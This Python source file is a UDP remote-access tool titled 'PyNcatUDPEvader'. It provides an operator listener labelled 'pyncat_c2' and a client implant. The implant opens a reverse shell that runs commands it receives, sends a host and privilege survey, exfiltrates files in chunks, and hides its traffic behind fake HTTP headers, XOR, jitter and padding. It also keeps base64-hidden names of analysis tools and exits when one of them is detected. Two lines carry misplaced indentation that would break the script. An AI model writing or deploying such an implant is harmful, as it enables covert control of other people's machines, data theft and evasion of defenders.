#!/usr/bin/env python3
import argparse
import socket
import sys
import logging
import os
import hashlib
import time
import random
import struct
import subprocess
import threading
import base64
import tqdm

# Load structural AES-GCM engine components for UDP security profiles if available
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    HAS_CRYPTOGRAPHY = True
except ImportError:
    HAS_CRYPTOGRAPHY = False

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)

class SecureUDPWrapper:
    """Handles AES-GCM authenticated symmetric encryption for raw UDP datagrams."""
    def __init__(self, psk: str):
        salt = b'PyNcat_Static_Salt_For_UDP_AES'
        self.key = hashlib.pbkdf2_hmac('sha256', psk.encode(), salt, 100000, 32)
        self.aesgcm = AESGCM(self.key)

    def encrypt(self, plaintext: bytes) -> bytes:
        nonce = os.urandom(12)
        ciphertext = self.aesgcm.encrypt(nonce, plaintext, None)
        return nonce + ciphertext

    def decrypt(self, encrypted_packet: bytes) -> bytes:
        if len(encrypted_packet) < 28:
            raise ValueError("Packet structurally too short.")
        nonce = encrypted_packet[:12]
        ciphertext = encrypted_packet[12:]
        return self.aesgcm.decrypt(nonce, ciphertext, None)


class XORObfuscator:
    """Implements a stateful, rotational multi-byte XOR obfuscation engine."""
    def __init__(self, seed_key: str):
        self.initial_key = seed_key.encode('utf-8') if isinstance(seed_key, str) else seed_key
        self.current_key = hashlib.sha256(self.initial_key).digest()
        self.key_len = len(self.current_key)
        self.packet_counter = 0

    def process(self, data: bytes, rotate: bool = True) -> bytes:
        if not self.key_len:
            return data
        output = bytes(b ^ self.current_key[i % self.key_len] for i, b in enumerate(data))
        if rotate:
            self.rotate_key()
        return output

    def rotate_key(self):
        """Derives a new key deterministically using a SHA256 chain modifier."""
        self.packet_counter += 1
        salt = struct.pack('!I', self.packet_counter)
        self.current_key = hashlib.sha256(self.current_key + salt).digest()
        self.key_len = len(self.current_key)

    def reset_state(self):
        """Resets the state machine back to default (for client socket recreations)."""
        self.current_key = hashlib.sha256(self.initial_key).digest()
        self.key_len = len(self.current_key)
        self.packet_counter = 0


class ProtocolCamouflage:
    """Wraps payloads inside mock application headers and parses them out on delivery."""
    def __init__(self, enabled: bool = False, mode: str = "http"):
        self.enabled = enabled
        self.mode = mode.lower()

    def apply_header(self, payload: bytes) -> bytes:
        if not self.enabled:
            return payload
        if self.mode == "http":
            payload_str = payload.decode('utf-8', errors='replace')
            http_template = (
                f"POST /api/v1/metrics HTTP/1.1\r\n"
                f"Host: cloud-telemetry.internal\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(payload_str) + 5}\r\n"
                f"Connection: close\r\n\r\n"
                f"data={payload_str}"
            )
            return http_template.encode('utf-8')
        return payload

    def strip_header(self, data: bytes) -> bytes:
        if not self.enabled:
            return data
        if self.mode == "http":
            try:
                data_str = data.decode('utf-8', errors='replace')
                if "data=" in data_str:
                    parts = data_str.split("data=", 1)
                    return parts[1].encode('utf-8')
            except Exception as e:
                raise ValueError(f"Camouflage extraction boundary fault: {e}")
        return data


class PyNcatUDPEvader:
    def __init__(self):
        self.args = self.parse_args()
        if self.args.verbose:
            logging.getLogger().setLevel(logging.DEBUG)
        
        self.udp_crypto = None
        self.xor_engine = XORObfuscator(self.args.xor) if self.args.xor else None
        self.camofleur = ProtocolCamouflage(enabled=self.args.camo, mode="http")
        
        # --- OBFUSCATED PROCESS BLACKLIST ENGINE ---
        # Stores targeted analysis tool signatures in base64 to evade simple string sweeps on disk
        obfuscated_b64_pool = [
            "d2lyZXNoYXJrLmV4ZQ==", "dHNoYXJrLmV4ZQ==", "ZHVtcGNhcC5leGU=", "cmF3c2hhcmsuZXhl",  
            "Y2FwaW5mb3MuZXhl", "ZWRpdGNhcC5leGU=", "bWVyZ2VjYXAuZXhl", "dGV4dDJwY2FwLmV4ZQ==",  
            "d2lyZXNoYXJr", "dHNoYXJr", "ZHVtcGNhcA==", "cmF3c2hhcms=",                        
            "Y2FwaW5mb3M=", "ZWRpdGNhcA==", "bWVyZ2VjYXA=", "dGV4dDJwY2Fw",                  
            "dGNwZHVtcA==", "dGNwZHVtcC5leGU=", "d2luZHVtcC5leGU=",                         
            "cHJvY21vbi5leGU=", "cHJvY2V4cC5leGU=", "cHJvY2Vzc2hhY2tlci5leGU=",             
            "eDY0ZGJnLmV4ZQ==", "eDMyZGJnLmV4ZQ==", "b2xseWRiZy5leGU=", "Z2hpZHJh",          
            "c3lzbW9uLmV4ZQ==", "c3lzbW9u", "c3RyYWNl", "bHNvZg=="                         
        ]
        
        self.process_blacklist = []
        for encoded_str in obfuscated_b64_pool:
            try:
                decoded_bytes = base64.b64decode(encoded_str.encode('utf-8'))
                self.process_blacklist.append(decoded_bytes.decode('utf-8', errors='replace'))
            except Exception:
                continue
        # --------------------------------------------
        
        if self.args.pad_target > 0 and self.args.pad_target < 16:
            logging.error("[!] --pad-target must be at least 16 bytes to support sequential rotation bounds.")
            sys.exit(1)

        if self.args.ssl:
            if not HAS_CRYPTOGRAPHY:
                logging.error("[!] Secure UDP requested, but 'cryptography' library is missing.")
                sys.exit(1)
            if not self.args.key:
                logging.error("[!] UDP encryption requires a passphrase via --key <passphrase>")
                sys.exit(1)
            self.udp_crypto = SecureUDPWrapper(self.args.key)

    def parse_args(self):
        parser = argparse.ArgumentParser(
            description="PyNcat - Advanced Camouflaged Multi-Endpoint UDP Mesh Framework", 
            formatter_class=argparse.ArgumentDefaultsHelpFormatter
        )
        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-l', '--listen', action='store_true', help='Listen mode (Server)')
        group.add_argument('-c', '--connect', type=str, nargs='+', help='Connect to a list of target IPs/Domains (Client Pool)')
        
        parser.add_argument('-p', '--port', type=int, required=True, help='UDP Port number')
        parser.add_argument('-f', '--file', type=str, help='File to upload/transmit')
        parser.add_argument('-o', '--output', type=str, help='Save received data stream to file')
        parser.add_argument('-e', '--execute', action='store_true', help='Deploy automated reverse shell subprocess broker')
        
        parser.add_argument('--ssl', action='store_true', help='Enable cryptographic AES-GCM payload encryption')
        parser.add_argument('--key', type=str, help='UDP Pre-shared Key/Password passphrase for AES-GCM mode')
        parser.add_argument('--xor', type=str, help='Enable stateful rolling multi-byte XOR obfuscation with specified key')
        parser.add_argument('--b64', action='store_true', help='Encapsulate outgoing data streams into printable Base64 strings')
        parser.add_argument('--camo', action='store_true', help='Wrap payloads inside dummy application HTTP request templates')
        
        parser.add_argument('--delay', type=float, default=0.0, help='Base delay in seconds between interactive transmissions')
        parser.add_argument('--burst-delay', type=float, default=0.0, help='Inter-packet sleep delay in seconds during file streaming bursts')
        parser.add_argument('--jitter', type=float, default=0.0, help='Jitter percentage as a decimal variance envelope (e.g., 0.30 for 30%%)')
        parser.add_argument('--heartbeat', type=float, default=15.0, help='Base heartbeat interval in seconds for stateless link preservation')
        
        parser.add_argument('--min-chunk', type=int, default=512, help='Minimum chunk size in bytes for dynamic file streaming limits')
        parser.add_argument('--max-chunk', type=int, default=1400, help='Maximum chunk size in bytes to prevent MTU fragmentation splits')
        parser.add_argument('--pad-target', type=int, default=0, help='Pad all transmitted packets to a fixed size structure (0 to disable)')
        
        parser.add_argument('--retry', type=int, default=-1, help='Max network socket recreation retry attempts (-1 for infinite)')
        parser.add_argument('-v', '--verbose', action='store_true', help='Verbose debug logging output')
        
        return parser.parse_args()

    def _apply_sleep(self, base_delay: float):
        if base_delay <= 0:
            return
        if self.args.jitter > 0:
            variance = base_delay * self.args.jitter
            actual_sleep = random.uniform(base_delay - variance, base_delay + variance)
            time.sleep(max(0.001, actual_sleep))
        else:
            time.sleep(base_delay)

    def _process_watcher_worker(self, shutdown_event: threading.Event, client_socket: socket.socket):
        """Asynchronously monitors local execution environments for targeted analysis suites."""
        import platform
        os_type = platform.system().lower()
        while not shutdown_event.is_set():
            try:
                                detected = []
                if os_type == "windows":
                    cmd_output = subprocess.check_output("tasklist /NH /FO CSV", shell=True, stderr=subprocess.DEVNULL).decode('utf-8', errors='replace').lower()
                else:
                    cmd_output = subprocess.check_output("ps -A -o comm=", shell=True, stderr=subprocess.DEVNULL).decode('utf-8', errors='replace').lower()

                for target_proc in self.process_blacklist:
                    if target_proc.lower() in cmd_output:
                        detected.append(target_proc)

                if detected:
                    logging.warning(f"[!] Safety Termination Triggered: Found analytical dependencies {detected}")
                    shutdown_event.set()
                    try:
                        client_socket.close()
                    except Exception:
                        pass
                    os._exit(0)

                self._apply_sleep(random.uniform(5.0, 10.0))
            except Exception:
                self._apply_sleep(10.0)

    def run_system_survey(self) -> bytes:
        """Gathers basic host operating metrics for localized node tracking contexts."""
        import platform
        import getpass
        survey = [
            "=== HOST SYSTEM SURVEY DATA ===",
            f"Timestamp : {time.strftime('%Y-%m-%d %H:%M:%S')}",
            f"Hostname  : {platform.node()}",
            f"OS Type   : {platform.system()} ({platform.release()})",
            f"User      : {getpass.getuser()}"
        ]
        if platform.system().lower() == "windows":
            try:
                subprocess.check_output("net session", shell=True, stderr=subprocess.STDOUT)
                survey.append("Privileges: Administrative Tokens Present")
            except subprocess.CalledProcessError:
                survey.append("Privileges: Standard User Context")
            try:
                net_map = subprocess.check_output("ipconfig", shell=True).decode('utf-8', errors='replace')
                survey.append("\n--- NETWORK SUMMARY ---\n" + net_map)
            except Exception:
                pass
        else:
            survey.append(f"Privileges: {'Root context active' if os.getuid() == 0 else 'Standard User Context'}")
            try:
                net_map = subprocess.check_output("ip address show || ifconfig", shell=True).decode('utf-8', errors='replace')
                survey.append("\n--- NETWORK SUMMARY ---\n" + net_map)
            except Exception:
                pass
        survey.append("===============================\n")
        return "\n".join(survey).encode('utf-8')

    def _pack_and_secure(self, payload: bytes) -> bytes:
        if self.xor_engine:
            seq_header = struct.pack('!I', self.xor_engine.packet_counter)
            payload = seq_header + payload
        if self.args.pad_target > 0:
            payload_len = len(payload)
            if payload_len + 4 <= self.args.pad_target:
                header = struct.pack('!I', payload_len)
                padding_needed = self.args.pad_target - (payload_len + 4)
                payload = header + payload + os.urandom(padding_needed)
        if self.xor_engine:
            payload = self.xor_engine.process(payload)
        if self.args.ssl and self.udp_crypto:
            payload = self.udp_crypto.encrypt(payload)
        if self.args.b64:
            payload = base64.b64encode(payload)
        return self.camofleur.apply_header(payload)

    def _unpack_and_verify(self, data: bytes) -> bytes:
        data = self.camofleur.strip_header(data)
        if self.args.b64:
            try:
                data = base64.b64decode(data)
            except Exception as e:
                raise ValueError(f"Base64 fault: {e}")
        if self.args.ssl and self.udp_crypto:
            data = self.udp_crypto.decrypt(data)
        if self.xor_engine:
            data = self.xor_engine.process(data)
        if self.args.pad_target > 0:
            if len(data) >= 4:
                actual_len = struct.unpack('!I', data[:4])[0]
                data = data[4:4 + actual_len]
            else:
                raise ValueError("Padding boundaries violation.")
        if self.xor_engine:
            if len(data) >= 4:
                remote_seq = struct.unpack('!I', data[:4])[0]
                data = data[4:]
                if self.xor_engine.packet_counter < remote_seq:
                    while self.xor_engine.packet_counter < remote_seq:
                        self.xor_engine.rotate_key()
            else:
                raise ValueError("Desynchronization error.")
        return data

    def listen(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        server.bind(("0.0.0.0", self.args.port))
        logging.info(f"[*] Listening for UDP datagrams on 0.0.0.0:{self.args.port}")
        output_file_handle = open(self.args.output, "wb") if self.args.output else None
        try:
            while True:
                raw_data, addr = server.recvfrom(65507)
                try:
                    data = self._unpack_and_verify(raw_data)
                except Exception:
                    continue
                if data == b"__PING__":
                    server.sendto(self._pack_and_secure(b"__PONG__"), addr)
                    continue
                if data == b"__PONG__":
                    continue
                if b"__EOF__" in data:
                    if output_file_handle:
                        break
                    continue
                if output_file_handle:
                    output_file_handle.write(data)
                else:
                    clean_msg = data.decode('utf-8', errors='replace').strip()
                    if clean_msg:
                        print(f"\n[{addr[0]}:{addr[1]}]:\n{clean_msg}")
                    sys.stdout.write("pyncat_c2> ")
                    sys.stdout.flush()
                    response_input = sys.stdin.readline()
                    if response_input:
                        server.sendto(self._pack_and_secure(response_input.encode()), addr)
        except KeyboardInterrupt:
            pass
        finally:
            if output_file_handle:
                output_file_handle.close()
            server.close()

    def connect(self):
        retry_count = 0
        max_retries = self.args.retry
        endpoint_pool = self.args.connect
        if not endpoint_pool:
            return
        while True:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                if self.xor_engine:
                    self.xor_engine.reset_state()

                def send_packet(payload: bytes):
                    target_destination = (random.choice(endpoint_pool), self.args.port)
                    client.sendto(self._pack_and_secure(payload), target_destination)

                if self.args.execute:
                    client.settimeout(45)
                    last_activity = [time.time()]
                    heartbeat_running = threading.Event()
                    heartbeat_running.set()
                    threading.Thread(target=self._process_watcher_worker, args=(heartbeat_running, client), daemon=True).start()

                    def heartbeat_worker():
                        while heartbeat_running.is_set():
                            try:
                                if time.time() - last_activity[0] >= self.args.heartbeat:
                                    send_packet(b"__PING__")
                                    last_activity[0] = time.time()
                                self._apply_sleep(self.args.heartbeat * 0.25)
                            except Exception:
                                break

                    threading.Thread(target=heartbeat_worker, daemon=True).start()
                    send_packet(self.run_system_survey())
                    
                    try:
                        while heartbeat_running.is_set():
                            try:
                                raw_packet, addr = client.recvfrom(65507)
                                last_activity[0] = time.time()
                                instruction_bytes = self._unpack_and_verify(raw_packet)
                                if instruction_bytes in (b"__PONG__", b"__PING__"):
                                    continue
                                cmd = instruction_bytes.decode('utf-8', errors='replace').strip()
                                if not cmd:
                                    continue
                                if cmd.lower() in ['exit', 'quit']:
                                    heartbeat_running.clear()
                                    return
                                try:
                                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                    stdout, stderr = proc.communicate(timeout=15)
                                    response = stdout + stderr
                                    if not response:
                                        response = b"[+] Process executed cleanly.\n"
                                except subprocess.TimeoutExpired:
                                    proc.kill()
                                    response = b"[-] Boundary timeout reached.\n"
                                except Exception as e:
                                    response = f"[-] Execution error: {e}\n".encode()
                                self._apply_sleep(self.args.delay)
                                send_packet(response)
                                last_activity[0] = time.time()
                            except socket.timeout:
                                break
                    finally:
                        heartbeat_running.clear()
                    return
                                elif self.args.file and os.path.exists(self.args.file):
                    filesize = os.path.getsize(self.args.file)
                    min_c, max_c = max(16, self.args.min_chunk), min(1400, self.args.max_chunk)
                    with open(self.args.file, 'rb') as f, tqdm.tqdm(total=filesize, unit='B', unit_scale=True, desc="Evasive Upload") as pbar:
                        while True:
                            chunk = f.read(random.randint(min_c, max_c))
                            if not chunk:
                                break
                            send_packet(chunk)
                            pbar.update(len(chunk))
                            self._apply_sleep(self.args.burst_delay)
                    send_packet(b"__EOF__")
                    return
                else:
                    while True:
                        user_input = sys.stdin.readline()
                        if not user_input or user_input.strip() == "":
                            break
                        send_packet(user_input.encode())
                        self._apply_sleep(self.args.delay)
                    break
            except (socket.error, Exception) as fault:
                try:
                    client.close()
                except NameError:
                    pass
                if max_retries != -1 and retry_count >= max_retries:
                    break
                retry_count += 1
                time.sleep(self.args.delay if self.args.delay > 0 else 5)
            finally:
                try:
                    client.close()
                except NameError:
                    pass

    def run(self):
        if self.args.listen:
            self.listen()
        elif self.args.connect:
            self.connect()


if __name__ == '__main__':
    PyNcatUDPEvader().run()
